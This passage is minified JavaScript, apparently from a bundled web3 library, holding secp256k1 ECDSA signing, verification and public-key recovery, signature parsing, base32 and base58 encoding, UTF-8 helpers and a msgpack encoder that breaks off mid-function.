y(U,M,N)}subtract(v){return this.add(v.negate())}is0(){return this.equals(y.ZERO)}wNAF(v){return R.wNAFCached(this,v,y.normalizeZ)}multiplyUnsafe(v){const{endo:k,n:O}=e;Xb("scalar",v,mf,O);const _=y.ZERO;if(v===mf)return _;if(this.is0()||v===Qi)return this;if(!k||R.hasPrecomputes(this))return R.wNAFCachedUnsafe(this,v,y.normalizeZ);let{k1neg:I,k1:T,k2neg:B,k2:U}=k.splitScalar(v),M=_,N=_,q=this;for(;T>mf||U>mf;)T&Qi&&(M=M.add(q)),U&Qi&&(N=N.add(q)),q=q.double(),T>>=Qi,U>>=Qi;return I&&(M=M.negate()),B&&(N=N.negate()),N=new y(n.mul(N.px,k.beta),N.py,N.pz),M.add(N)}multiply(v){const{endo:k,n:O}=e;Xb("scalar",v,Qi,O);let _,I;if(k){const{k1neg:T,k1:B,k2neg:U,k2:M}=k.splitScalar(v);let{p:N,f:q}=this.wNAF(B),{p:P,f:C}=this.wNAF(M);N=R.constTimeNegate(T,N),P=R.constTimeNegate(U,P),P=new y(n.mul(P.px,k.beta),P.py,P.pz),_=N.add(P),I=q.add(C)}else{const{p:T,f:B}=this.wNAF(v);_=T,I=B}return y.normalizeZ([_,I])[0]}multiplyAndAddUnsafe(v,k,O){const _=y.BASE,I=(B,U)=>U===mf||U===Qi||!B.equals(_)?B.multiplyUnsafe(U):B.multiply(U),T=I(this,k).add(I(v,O));return T.is0()?void 0:T}toAffine(v){return b(this,v)}isTorsionFree(){const{h:v,isTorsionFree:k}=e;if(v===Qi)return!0;if(k)return k(y,this);throw new Error("isTorsionFree() has not been declared for the elliptic curve")}clearCofactor(){const{h:v,clearCofactor:k}=e;return v===Qi?this:k?k(y,this):this.multiplyUnsafe(e.h)}toRawBytes(v=!0){return o_("isCompressed",v),this.assertValidity(),i(y,this,v)}toHex(v=!0){return o_("isCompressed",v),a_(this.toRawBytes(v))}}y.BASE=new y(e.Gx,e.Gy,n.ONE),y.ZERO=new y(n.ZERO,n.ONE,n.ZERO);const{endo:E,nBitLength:A}=e,R=zAe(y,E?Math.ceil(A/2):A);return{CURVE:e,ProjectivePoint:y,normPrivateKeyToScalar:h,weierstrassEquation:o,isWithinCurveOrder:f}}function ZAe(t){const e=lse(t);return GI(e,{hash:"hash",hmac:"function",randomBytes:"function"},{bits2int:"function",bits2int_modN:"function",lowS:"boolean"}),Object.freeze({lowS:!0,...e})}function YAe(t){const e=ZAe(t),{Fp:n,n:r,nByteLength:i,nBitLength:s}=e,o=n.BYTES+1,a=2*n.BYTES+1;function c(P){return Ko(P,r)}function l(P){return Qk(P,r)}const{ProjectivePoint:f,normPrivateKeyToScalar:h,weierstrassEquation:m,isWithinCurveOrder:b}=KAe({...e,toBytes(P,C,j){const z=C.toAffine(),$=n.toBytes(z.x),H=Cx;return o_("isCompressed",j),j?H(Uint8Array.from([C.hasEvenY()?2:3]),$):H(Uint8Array.from([4]),$,n.toBytes(z.y))},fromBytes(P){const C=P.length,j=P[0],z=P.subarray(1);if(C===o&&(j===2||j===3)){const $=Ym(z);if(!yB($,Qi,n.ORDER))throw new Error("Point is not on curve");const H=m($);let L;try{L=n.sqrt(H)}catch(Z){const J=Z instanceof Error?": "+Z.message:"";throw new Error("Point is not on curve"+J)}const V=(L&Qi)===Qi;return(j&1)===1!==V&&(L=n.neg(L)),{x:$,y:L}}else if(C===a&&j===4){const $=n.fromBytes(z.subarray(0,n.BYTES)),H=n.fromBytes(z.subarray(n.BYTES,2*n.BYTES));return{x:$,y:H}}else{const $=o,H=a;throw new Error("invalid Point, expected length of "+$+", or uncompressed "+H+", got "+C)}}});function w(P){const C=r>>Qi;return P>C}function y(P){return w(P)?c(-P):P}const E=(P,C,j)=>Ym(P.slice(C,j));class A{constructor(C,j,z){Xb("r",C,Qi,r),Xb("s",j,Qi,r),this.r=C,this.s=j,z!=null&&(this.recovery=z),Object.freeze(this)}static fromCompact(C){const j=i;return C=Rc("compactSignature",C,j*2),new A(E(C,0,j),E(C,j,2*j))}static fromDER(C){const{r:j,s:z}=df.toSig(Rc("DER",C));return new A(j,z)}assertValidity(){}addRecoveryBit(C){return new A(this.r,this.s,C)}recoverPublicKey(C){const{r:j,s:z,recovery:$}=this,H=_(Rc("msgHash",C));if($==null||![0,1,2,3].includes($))throw new Error("recovery id invalid");const L=$===2||$===3?j+e.n:j;if(L>=n.ORDER)throw new Error("recovery id 2 or 3 invalid");const V=($&1)===0?"02":"03",G=f.fromHex(V+o9(L,n.BYTES)),Z=l(L),J=c(-H*Z),ne=c(z*Z),re=f.BASE.multiplyAndAddUnsafe(G,J,ne);if(!re)throw new Error("point at infinify");return re.assertValidity(),re}hasHighS(){return w(this.s)}normalizeS(){return this.hasHighS()?new A(this.r,c(-this.s),this.recovery):this}toDERRawBytes(){return Ax(this.toDERHex())}toDERHex(){return df.hexFromSig(this)}toCompactRawBytes(){return Ax(this.toCompactHex())}toCompactHex(){const C=i;return o9(this.r,C)+o9(this.s,C)}}const R={isValidPrivateKey(P){try{return h(P),!0}catch{return!1}},normPrivateKeyToScalar:h,randomPrivateKey:()=>{const P=ase(e.n);return FAe(e.randomBytes(P),e.n)},precompute(P=8,C=f.BASE){return C._setWindowSize(P),C.multiply(BigInt(3)),C}};function S(P,C=!0){return f.fromPrivateKey(P).toRawBytes(C)}function v(P){if(typeof P=="bigint")return!1;if(P instanceof f)return!0;const j=Rc("key",P).length,z=n.BYTES,$=z+1,H=2*z+1;if(!(e.allowedPrivateKeyLengths||i===$))return j===$||j===H}function k(P,C,j=!0){if(v(P)===!0)throw new Error("first arg must be private key");if(v(C)===!1)throw new Error("second arg must be public key");return f.fromHex(C).multiply(h(P)).toRawBytes(j)}const O=e.bits2int||function(P){if(P.length>8192)throw new Error("input is too large");const C=Ym(P),j=P.length*8-s;return j>0?C>>BigInt(j):C},_=e.bits2int_modN||function(P){return c(O(P))},I=WI(s);function T(P){return Xb("num < 2^"+s,P,mf,I),Q_(P,i)}function B(P,C,j=U){if(["recovered","canonical"].some(oe=>oe in j))throw new Error("sign() legacy options not supported");const{hash:z,randomBytes:$}=e;let{lowS:H,prehash:L,extraEntropy:V}=j;H==null&&(H=!0),P=Rc("msgHash",P),Rz(j),L&&(P=Rc("prehashed msgHash",z(P)));const G=_(P),Z=h(C),J=[T(Z),T(G)];if(V!=null&&V!==!1){const oe=V===!0?$(n.BYTES):V;J.push(Rc("extraEntropy",oe))}const ne=Cx(...J),re=G;function le(oe){const ue=O(oe);if(!b(ue))return;const be=l(ue),Me=f.BASE.multiply(ue).toAffine(),Te=c(Me.x);if(Te===mf)return;const Oe=c(be*c(re+Te*Z));if(Oe===mf)return;let Ke=(Me.x===Te?0:2)|Number(Me.y&Qi),it=Oe;return H&&w(Oe)&&(it=y(Oe),Ke^=1),new A(Te,it,Ke)}return{seed:ne,k2sig:le}}const U={lowS:e.lowS,prehash:!1},M={lowS:e.lowS,prehash:!1};function N(P,C,j=U){const{seed:z,k2sig:$}=B(P,C,j),H=e;return K_e(H.hash.outputLen,H.nByteLength,H.hmac)(z,$)}f.BASE._setWindowSize(8);function q(P,C,j,z=M){const $=P;C=Rc("msgHash",C),j=Rc("publicKey",j);const{lowS:H,prehash:L,format:V}=z;if(Rz(z),"strict"in z)throw new Error("options.strict was renamed to lowS");if(V!==void 0&&V!=="compact"&&V!=="der")throw new Error("format must be compact or der");const G=typeof $=="string"||Y_($),Z=!G&&!V&&typeof $=="object"&&$!==null&&typeof $.r=="bigint"&&typeof $.s=="bigint";if(!G&&!Z)throw new Error("invalid signature, expected Uint8Array, hex string or Signature instance");let J,ne;try{if(Z&&(J=new A($.r,$.s)),G){try{V!=="compact"&&(J=A.fromDER($))}catch(Ke){if(!(Ke instanceof df.Err))throw Ke}!J&&V!=="der"&&(J=A.fromCompact($))}ne=f.fromHex(j)}catch{return!1}if(!J||H&&J.hasHighS())return!1;L&&(C=e.hash(C));const{r:re,s:le}=J,oe=_(C),ue=l(le),be=c(oe*ue),Me=c(re*ue),Te=f.BASE.multiplyAndAddUnsafe(ne,be,Me)?.toAffine();return Te?c(Te.x)===re:!1}return{CURVE:e,getPublicKey:S,getSharedSecret:k,sign:N,verify:q,ProjectivePoint:f,Signature:A,utils:R}}function QAe(t){return{hash:t,hmac:(e,...n)=>Xie(t,e,v_e(...n)),randomBytes:E_e}}function JAe(t,e){const n=r=>YAe({...t,...QAe(r)});return{...n(e),create:n}}const dse=BigInt("0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"),Pz=BigInt("0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"),XAe=BigInt(0),e5e=BigInt(1),Xk=BigInt(2),Nz=(t,e)=>(t+e/Xk)/e;function t5e(t){const e=dse,n=BigInt(3),r=BigInt(6),i=BigInt(11),s=BigInt(22),o=BigInt(23),a=BigInt(44),c=BigInt(88),l=t*t*t%e,f=l*l*t%e,h=vc(f,n,e)*f%e,m=vc(h,n,e)*f%e,b=vc(m,Xk,e)*l%e,w=vc(b,i,e)*b%e,y=vc(w,s,e)*w%e,E=vc(y,a,e)*y%e,A=vc(E,c,e)*E%e,R=vc(A,a,e)*y%e,S=vc(R,n,e)*f%e,v=vc(S,o,e)*w%e,k=vc(v,r,e)*l%e,O=vc(k,Xk,e);if(!e7.eql(e7.sqr(O),t))throw new Error("Cannot find square root");return O}const e7=vB(dse,void 0,void 0,{sqrt:t5e}),n5e=JAe({a:XAe,b:BigInt(7),Fp:e7,n:Pz,Gx:BigInt("55066263022277343669578718895168534326250603453777594175500187360389116729240"),Gy:BigInt("32670510020758816978083085130507043184471273380659243275938904335757337482424"),h:BigInt(1),lowS:!0,endo:{beta:BigInt("0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"),splitScalar:t=>{const e=Pz,n=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-e5e*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),s=n,o=BigInt("0x100000000000000000000000000000000"),a=Nz(s*t,e),c=Nz(-r*t,e);let l=Ko(t-a*n-c*i,e),f=Ko(-a*r-c*s,e);const h=l>o,m=f>o;if(h&&(l=e-l),m&&(f=e-f),l>o||f>o)throw new Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:h,k1:l,k2neg:m,k2:f}}}},V_e);function r5e(t){if(t.length!==130&&t.length!==132)throw new s5e({signature:t});const e=BigInt(cf(t,0,32)),n=BigInt(cf(t,32,64)),r=(()=>{const i=+`0x${t.slice(130)}`;if(!Number.isNaN(i))try{return i5e(i)}catch{throw new o5e({value:i})}})();return typeof r>"u"?{r:e,s:n}:{r:e,s:n,yParity:r}}function i5e(t){if(t===0||t===27)return 0;if(t===1||t===28)return 1;if(t>=35)return t%2===0?1:0;throw new a5e({value:t})}class s5e extends Fr{constructor({signature:e}){super(`Value \`${e}\` is an invalid signature size.`,{metaMessages:["Expected: 64 bytes or 65 bytes.",`Received ${Np(wB(e))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidSerializedSizeError"})}}class o5e extends Fr{constructor({value:e}){super(`Value \`${e}\` is an invalid y-parity value. Y-parity must be 0 or 1.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidYParityError"})}}class a5e extends Fr{constructor({value:e}){super(`Value \`${e}\` is an invalid v value. v must be 27, 28 or >=35.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Signature.InvalidVError"})}}function c5e(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function fse(t,e){return Array.isArray(e)?e.length===0?!0:t?e.every(n=>typeof n=="string"):e.every(n=>Number.isSafeInteger(n)):!1}function Tx(t,e){if(typeof e!="string")throw new Error(`${t}: string expected`);return!0}function EB(t){if(!Number.isSafeInteger(t))throw new Error(`invalid integer: ${t}`)}function t7(t){if(!Array.isArray(t))throw new Error("array expected")}function xx(t,e){if(!fse(!0,e))throw new Error(`${t}: array of strings expected`)}function u5e(t,e){if(!fse(!1,e))throw new Error(`${t}: array of numbers expected`)}function l5e(...t){const e=s=>s,n=(s,o)=>a=>s(o(a)),r=t.map(s=>s.encode).reduceRight(n,e),i=t.map(s=>s.decode).reduce(n,e);return{encode:r,decode:i}}function d5e(t){const e=typeof t=="string"?t.split(""):t,n=e.length;xx("alphabet",e);const r=new Map(e.map((i,s)=>[i,s]));return{encode:i=>(t7(i),i.map(s=>{if(!Number.isSafeInteger(s)||s<0||s>=n)throw new Error(`alphabet.encode: digit index outside alphabet "${s}". Allowed: ${t}`);return e[s]})),decode:i=>(t7(i),i.map(s=>{Tx("alphabet.decode",s);const o=r.get(s);if(o===void 0)throw new Error(`Unknown letter: "${s}". Allowed: ${t}`);return o}))}}function f5e(t=""){return Tx("join",t),{encode:e=>(xx("join.decode",e),e.join(t)),decode:e=>(Tx("join.decode",e),e.split(t))}}function h5e(t,e="="){return EB(t),Tx("padding",e),{encode(n){for(xx("padding.encode",n);n.length*t%8;)n.push(e);return n},decode(n){xx("padding.decode",n);let r=n.length;if(r*t%8)throw new Error("padding: invalid, string should have whole number of bytes");for(;r>0&&n[r-1]===e;r--)if((r-1)*t%8===0)throw new Error("padding: invalid, string has too much padding");return n.slice(0,r)}}}const hse=(t,e)=>e===0?t:hse(e,t%e),Ix=(t,e)=>t+(e-hse(t,e)),c9=(()=>{let t=[];for(let e=0;e<40;e++)t.push(2**e);return t})();function Oz(t,e,n,r){if(t7(t),e<=0||e>32)throw new Error(`convertRadix2: wrong from=${e}`);if(n<=0||n>32)throw new Error(`convertRadix2: wrong to=${n}`);if(Ix(e,n)>32)throw new Error(`convertRadix2: carry overflow from=${e} to=${n} carryBits=${Ix(e,n)}`);let i=0,s=0;const o=c9[e],a=c9[n]-1,c=[];for(const l of t){if(EB(l),l>=o)throw new Error(`convertRadix2: invalid data word=${l} from=${e}`);if(i=i<<e|l,s+e>32)throw new Error(`convertRadix2: carry overflow pos=${s} from=${e}`);for(s+=e;s>=n;s-=n)c.push((i>>s-n&a)>>>0);const f=c9[s];if(f===void 0)throw new Error("invalid carry");i&=f-1}if(i=i<<n-s&a,!r&&s>=e)throw new Error("Excess padding");if(!r&&i>0)throw new Error(`Non-zero padding: ${i}`);return r&&s>0&&c.push(i>>>0),c}function p5e(t,e=!1){if(EB(t),t<=0||t>32)throw new Error("radix2: bits should be in (0..32]");if(Ix(8,t)>32||Ix(t,8)>32)throw new Error("radix2: carry overflow");return{encode:n=>{if(!c5e(n))throw new Error("radix2.encode input should be Uint8Array");return Oz(Array.from(n),8,t,!e)},decode:n=>(u5e("radix2.decode",n),Uint8Array.from(Oz(n,t,8,e)))}}const m5e=l5e(p5e(5),d5e("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"),h5e(5),f5e(""));function g5e(t){return PAe(y5e(t))}function y5e(t){const{payload:e,signature:n}=t,{r,s:i,yParity:s}=n,a=new n5e.Signature(BigInt(r),BigInt(i)).addRecoveryBit(s).recoverPublicKey(wB(e).substring(2));return EAe(a)}function b5e(t){if(t.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let l=0;l<e.length;l++)e[l]=255;for(let l=0;l<t.length;l++){const f=t.charAt(l),h=f.charCodeAt(0);if(e[h]!==255)throw new TypeError(f+" is ambiguous");e[h]=l}const n=t.length,r=t.charAt(0),i=Math.log(n)/Math.log(256),s=Math.log(256)/Math.log(n);function o(l){if(l instanceof Uint8Array||(ArrayBuffer.isView(l)?l=new Uint8Array(l.buffer,l.byteOffset,l.byteLength):Array.isArray(l)&&(l=Uint8Array.from(l))),!(l instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(l.length===0)return"";let f=0,h=0,m=0;const b=l.length;for(;m!==b&&l[m]===0;)m++,f++;const w=(b-m)*s+1>>>0,y=new Uint8Array(w);for(;m!==b;){let R=l[m],S=0;for(let v=w-1;(R!==0||S<h)&&v!==-1;v--,S++)R+=256*y[v]>>>0,y[v]=R%n>>>0,R=R/n>>>0;if(R!==0)throw new Error("Non-zero carry");h=S,m++}let E=w-h;for(;E!==w&&y[E]===0;)E++;let A=r.repeat(f);for(;E<w;++E)A+=t.charAt(y[E]);return A}function a(l){if(typeof l!="string")throw new TypeError("Expected String");if(l.length===0)return new Uint8Array;let f=0,h=0,m=0;for(;l[f]===r;)h++,f++;const b=(l.length-f)*i+1>>>0,w=new Uint8Array(b);for(;f<l.length;){const R=l.charCodeAt(f);if(R>255)return;let S=e[R];if(S===255)return;let v=0;for(let k=b-1;(S!==0||v<m)&&k!==-1;k--,v++)S+=n*w[k]>>>0,w[k]=S%256>>>0,S=S/256>>>0;if(S!==0)throw new Error("Non-zero carry");m=v,f++}let y=b-m;for(;y!==b&&w[y]===0;)y++;const E=new Uint8Array(h+(b-y));let A=h;for(;y!==b;)E[A++]=w[y++];return E}function c(l){const f=a(l);if(f)return f;throw new Error("Non-base"+n+" character")}return{encode:o,decodeUnsafe:a,decode:c}}var w5e="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const rw=b5e(w5e);function v5e(t){const e=t.length;let n=0,r=0;for(;r<e;){let i=t.charCodeAt(r++);if((i&4294967168)===0){n++;continue}else if((i&4294965248)===0)n+=2;else{if(i>=55296&&i<=56319&&r<e){const s=t.charCodeAt(r);(s&64512)===56320&&(++r,i=((i&1023)<<10)+(s&1023)+65536)}(i&4294901760)===0?n+=3:n+=4}}return n}function E5e(t,e,n){const r=t.length;let i=n,s=0;for(;s<r;){let o=t.charCodeAt(s++);if((o&4294967168)===0){e[i++]=o;continue}else if((o&4294965248)===0)e[i++]=o>>6&31|192;else{if(o>=55296&&o<=56319&&s<r){const a=t.charCodeAt(s);(a&64512)===56320&&(++s,o=((o&1023)<<10)+(a&1023)+65536)}(o&4294901760)===0?(e[i++]=o>>12&15|224,e[i++]=o>>6&63|128):(e[i++]=o>>18&7|240,e[i++]=o>>12&63|128,e[i++]=o>>6&63|128)}e[i++]=o&63|128}}const _5e=new TextEncoder,A5e=50;function C5e(t,e,n){_5e.encodeInto(t,e.subarray(n))}function S5e(t,e,n){t.length>A5e?C5e(t,e,n):E5e(t,e,n)}const T5e=4096;function pse(t,e,n){let r=e;const i=r+n,s=[];let o="";for(;r<i;){const a=t[r++];if((a&128)===0)s.push(a);else if((a&224)===192){const c=t[r++]&63;s.push((a&31)<<6|c)}else if((a&240)===224){const c=t[r++]&63,l=t[r++]&63;s.push((a&31)<<12|c<<6|l)}else if((a&248)===240){const c=t[r++]&63,l=t[r++]&63,f=t[r++]&63;let h=(a&7)<<18|c<<12|l<<6|f;h>65535&&(h-=65536,s.push(h>>>10&1023|55296),h=56320|h&1023),s.push(h)}else s.push(a);s.length>=T5e&&(o+=String.fromCharCode(...s),s.length=0)}return s.length>0&&(o+=String.fromCharCode(...s)),o}const x5e=new TextDecoder,I5e=200;function R5e(t,e,n){const r=t.subarray(e,e+n);return x5e.decode(r)}function P5e(t,e,n){return n>I5e?R5e(t,e,n):pse(t,e,n)}class H3{constructor(e,n){this.type=e,this.data=n}}class za extends Error{constructor(e){super(e);const n=Object.create(za.prototype);Object.setPrototypeOf(this,n),Object.defineProperty(this,"name",{configurable:!0,enumerable:!1,value:za.name})}}const Cv=4294967295;function N5e(t,e,n){const r=n/4294967296,i=n;t.setUint32(e,r),t.setUint32(e+4,i)}function mse(t,e,n){const r=Math.floor(n/4294967296),i=n;t.setUint32(e,r),t.setUint32(e+4,i)}function gse(t,e){const n=t.getInt32(e),r=t.getUint32(e+4);return n*4294967296+r}function O5e(t,e){const n=t.getUint32(e),r=t.getUint32(e+4);return n*4294967296+r}const k5e=-1,D5e=4294967296-1,B5e=17179869184-1;function j5e({sec:t,nsec:e}){if(t>=0&&e>=0&&t<=B5e)if(e===0&&t<=D5e){const n=new Uint8Array(4);return new DataView(n.buffer).setUint32(0,t),n}else{const n=t/4294967296,r=t&4294967295,i=new Uint8Array(8),s=new DataView(i.buffer);return s.setUint32(0,e<<2|n&3),s.setUint32(4,r),i}else{const n=new Uint8Array(12),r=new DataView(n.buffer);return r.setUint32(0,e),mse(r,4,t),n}}function M5e(t){const e=t.getTime(),n=Math.floor(e/1e3),r=(e-n*1e3)*1e6,i=Math.floor(r/1e9);return{sec:n+i,nsec:r-i*1e9}}function U5e(t){if(t instanceof Date){const e=M5e(t);return j5e(e)}else return null}function L5e(t){const e=new DataView(t.buffer,t.byteOffset,t.byteLength);switch(t.byteLength){case 4:return{sec:e.getUint32(0),nsec:0};case 8:{const n=e.getUint32(0),r=e.getUint32(4),i=(n&3)*4294967296+r,s=n>>>2;return{sec:i,nsec:s}}case 12:{const n=gse(e,4),r=e.getUint32(0);return{sec:n,nsec:r}}default:throw new za(`Unrecognized data size for timestamp (expected 4, 8, or 12): ${t.length}`)}}function F5e(t){const e=L5e(t);return new Date(e.sec*1e3+e.nsec/1e6)}const $5e={type:k5e,encode:U5e,decode:F5e};class Rx{constructor(){this.builtInEncoders=[],this.builtInDecoders=[],this.encoders=[],this.decoders=[],this.register($5e)}register({type:e,encode:n,decode:r}){if(e>=0)this.encoders[e]=n,this.decoders[e]=r;else{const i=-1-e;this.builtInEncoders[i]=n,this.builtInDecoders[i]=r}}tryToEncode(e,n){for(let r=0;r<this.builtInEncoders.length;r++){const i=this.builtInEncoders[r];if(i!=null){const s=i(e,n);if(s!=null){const o=-1-r;return new H3(o,s)}}}for(let r=0;r<this.encoders.length;r++){const i=this.encoders[r];if(i!=null){const s=i(e,n);if(s!=null){const o=r;return new H3(o,s)}}}return e instanceof H3?e:null}decode(e,n,r){const i=n<0?this.builtInDecoders[-1-n]:this.decoders[n];return i?i(e,n,r):new H3(n,e)}}Rx.defaultCodec=new Rx;function H5e(t){return t instanceof ArrayBuffer||typeof SharedArrayBuffer<"u"&&t instanceof SharedArrayBuffer}function n7(t){return t instanceof Uint8Array?t:ArrayBuffer.isView(t)?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):H5e(t)?new Uint8Array(t):Uint8Array.from(t)}const z5e=100,q5e=2048;let V5e=class yse{constructor(e){this.entered=!1,this.extensionCodec=e?.extensionCodec??Rx.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.maxDepth=e?.maxDepth??z5e,this.initialBufferSize=e?.initialBufferSize??q5e,this.sortKeys=e?.sortKeys??!1,this.forceFloat32=e?.forceFloat32??!1,this.ignoreUndefined=e?.ignoreUndefined??!1,this.forceIntegerToFloat=e?.forceIntegerToFloat??!1,this.pos=0,this.view=new DataView(new ArrayBuffer(this.initialBufferSize)),this.bytes=new Uint8Array(this.view.buffer)}clone(){return new yse({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,maxDepth:this.maxDepth,initialBufferSize:this.initialBufferSize,sortKeys:this.sortKeys,forceFloat32:this.forceFloat32,ignoreUndefined:this.ignoreUndefined,forceIntegerToFloat:this.forceIntegerToFloat})}reinitializeState(){this.pos=0}encodeSharedRef(e){if(this.entered)return this.clone().encodeSharedRef(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.subarray(0,this.pos)}finally{this.entered=!1}}encode(e){if(this.entered)return this.clone().encode(e);try{return this.entered=!0,this.reinitializeState(),this.doEncode(e,1),this.bytes.slice(0,this.pos)}finally{this.entered=!1}}doEncode(e,n){if(n>this.maxDepth)throw new Error(`Too deep objects in depth ${n}`);e==null?this.encodeNil():typeof e=="boolean"?this.encodeBoolean(e):typeof e=="number"?this.forceIntegerToFloat?this.encodeNumberAsFloat(e):this.encodeNumber(e):typeof e=="string"?this.encodeString(e):this.useBigInt64&&typeof e=="bigint"?this.encodeBigInt64(e):this.encodeObject(e,n)}ensureBufferSizeToWrite(e){const n=this.pos+e;this.view.byteLength<n&&this.resizeBuffer(n*2)}resizeBuffer(e){const n=new ArrayBuffer(e),r=new Uint8Array(n),i=new DataView(n);r.set(this.bytes),this.view=i,this.bytes=r}encodeNil(){this.writeU8(192)}encodeBoolean(e){e===!1?this.writeU8(194):this.writeU8(195)}encodeNumber(e){!this.forceIntegerToFloat&&Number.isSafeInteger(e)?e>=0?e<128?this.writeU8(e):e<256?(this.writeU8(204),this.writeU8(e)):e<65536?(this.writeU8(205),this.writeU16(e)):e<4294967296?(this.writeU8(206),this.writeU32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(207),this.writeU64(e)):e>=-32?this.writeU8(224|e+32):e>=-128?(this.writeU8(208),this.writeI8(e)):e>=-32768?(this.writeU8(209),this.writeI16(e)):e>=-2147483648?(this.writeU8(210),this.writeI32(e)):this.useBigInt64?this.encodeNumberAsFloat(e):(this.writeU8(211),this.writeI64(e)):this.encodeNumberAsFloat(e)}encodeNumberAsFloat(e){this.forceFloat32?(this.writeU8(202),this.writeF32(e)):(this.writeU8(203),this.writeF64(e))}encodeBigInt64(e){e>=BigInt(0)?(this.writeU8(207),this.writeBigUint64(e)):(this.writeU8(211),this.writeBigInt64(e))}writeStringHeader(e){if(e<32)this.writeU8(160+e);else if(e<256)this.writeU8(217),this.writeU8(e);else if(e<65536)this.writeU8(218),this.writeU16(e);else if(e<4294967296)this.writeU8(219),this.writeU32(e);else throw new Error(`Too long string: ${e} bytes in UTF-8`)}encodeString(e){const r=v5e(e);this.ensureBufferSizeToWrite(5+r),this.writeStringHeader(r),S5e(e,this.bytes,this.pos),this.pos+=r}encodeObject(e,n){const r=this.extensionCodec.tryToEncode(e,this.context);if(r!=null)this.encodeExtension(r);else if(Array.isArray(e))this.encodeArray(e,n);else if(ArrayBuffer.isView(e))this.encodeBinary(e);else if(typeof e=="object")this.encodeMap(e,n);else throw new Error(`Unrecognized object: ${Object.prototype.toString.apply(e)}`)}encodeBinary(e){const n=e.byteLength;if(n<256)this.writeU8(196),this.writeU8(n);else if(n<65536)this.writeU8(197),this.writeU16(n);else if(n<4294967296)this.writeU8(198),this.writeU32(n);else throw new Error(`Too large binary: ${n}`);const r=n7(e);this.writeU8a(r)}encodeArray(e,n){const r=e.length;if(r<16)this.writeU8(144+r);else if(r<65536)this.writeU8(220),this.writeU16(r);else if(r<4294967296)this.writeU8(221),this.writeU32(r);else throw new Error(`Too large array: ${r}`);for(const i of e)this.doEncode(i,n+1)}countWithoutUndefined(e,n){let r=0;for(const i of n)e[i]!==void 0&&r++;return r}encodeMap(e,n){const r=Object.keys(e);this.sortKeys&&r.sort();const i=this.ignoreUndefined?this.countWithoutUndefined(e,r):r.length;if(i<16)this.writeU8(128+i);else if(i<65536)this.writeU8(222),this.writeU16(i);else if(i<4294967296)this.writeU8(223),this.writeU32(i);else throw new Error(`Too large map object: ${i}`);for(const s of r){const o=e[s];this.ignoreUndefined&&o===void 0||(this.encodeString(s),this.doEncode(o,n+1))}}encodeExtension(e){if(typeof e.data=="function"){const r=e.data(this.pos+6),i=r.length;if(i>=4294967296)throw new Error(`Too large extension object: ${i}`);this.writeU8(201),this.writeU32(i),this.writeI8(e.type),this.writeU8a(r);return}const n=e.data.length;if(n===1)this.writeU8(212);else if(n===2)this.writeU8(213);else if(n===4)this.writeU8(214);else if(n===8)this.writeU8(215);else if(n===16)this.writeU8(216);else if(n<256)this.writeU8(199),this.writeU8(n);else if(n<65536)this.writeU8(200),this.writeU16(n);else if(n<4294967296)this.writeU8(201),this.writeU32(n);else throw new Error(`Too large extension object: ${n}`);this.writeI8(e.type),this.writeU8a(e.data)}writeU8(e){this.ensureBufferSizeToWrite(1),this.view.setUint8(this.pos,e),this.pos++}writeU8a(e){const n=e.length;this.ensureBufferSizeToWrite(n),this.bytes.set(e,this.pos),this.pos+=n}writeI8(e){this.ensureBufferSizeToWrite(1),this.view.setInt8(this.pos,e),this.pos++}writeU16(e){this.ensureBufferSizeToWrite(2),this.view.setUint16(this.pos,e),this.pos+=2}writeI16(e){this.ensureBufferSizeToWrite(2),this.view.setInt16(this.pos,e),this.pos+=2}writeU32(e){this.ensureBufferSizeToWrite(4),this.view.setUint32(this.pos,e),this.pos+=4}writeI32(e){this.ensureBufferSizeToWrite(4),this.view.setInt32(this.pos,e),this.pos+=4}writeF32(e){this.ensureBufferSizeToWrite(4),this.view.setFloat32(this.pos,e),this.pos+=4}writeF64(e){this.ensureBufferSizeToWrite(8),this.view.setFloat64(this.pos,e),this.pos+=8}writeU64(e){this.ensureBufferSizeToWrite(8),N5e(this.view,this.pos,e),this.pos+=8}writeI64(e){this.ensureBufferSizeToWrite(8),mse(this.view,this.pos,e),this.pos+=8}writeBigUint64(e){this.ensureBufferSizeToWrite(8),this.view.setBigUint64(this.pos,e),this.pos+=8}writeBigInt64(e){this.ensureBufferSizeToWrite(8),this.view.setBigInt64(this.pos,e),this.pos+=8}};function W5e(t,e){return new V5e(e).encodeSharedRef(t)}function u9(t){return`${t<0?"-":""}0x${Math.abs(t).toString(16).padStart(2,"0")}`}const G5e=16,K5e=16;class Z5e{constructor(e=G5e,n=K5e){this.hit=0,this.miss=0,this.maxKeyLength=e,this.maxLengthPerKey=n,this.caches=[];for(let r=0;r<this.maxKeyLength;r++)this.caches.push([])}canBeCached(e){return e>0&&e<=this.maxKeyLength}find(e,n,r){const i=this.caches[r-1];e:for(const s of i){const o=s.bytes;for(let a=0;a<r;a++)if(o[a]!==e[n+a])continue e;return s.str}return null}store(e,n){const r=this.caches[e.length-1],i={bytes:e,str:n};r.length>=this.maxLengthPerKey?r[Math.random()*r.length|0]=i:r.push(i)}decode(e,n,r){const i=this.find(e,n,r);if(i!=null)return this.hit++,i;this.miss++;const 